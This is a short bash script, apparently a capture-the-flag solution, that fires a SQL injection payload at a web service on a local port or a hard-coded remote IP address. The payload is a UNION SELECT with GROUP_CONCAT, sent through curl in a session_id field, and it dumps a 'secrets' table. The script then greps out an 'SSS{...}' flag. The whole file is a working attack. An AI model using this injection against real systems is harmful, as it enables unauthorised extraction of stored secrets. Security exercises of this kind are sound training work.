#!/bin/bash
PORT=12000

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.118:'$PORT
else
    url=$1':'$2
fi

# t0p s3cr3t
echo "Start exploit for t0p s3cr3t"
flag=$(curl -s $url --data-raw "session_id=' UNION SELECT 1, GROUP_CONCAT(0x7c, secret, 0x7c) FROM secrets -- comment" | grep -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"
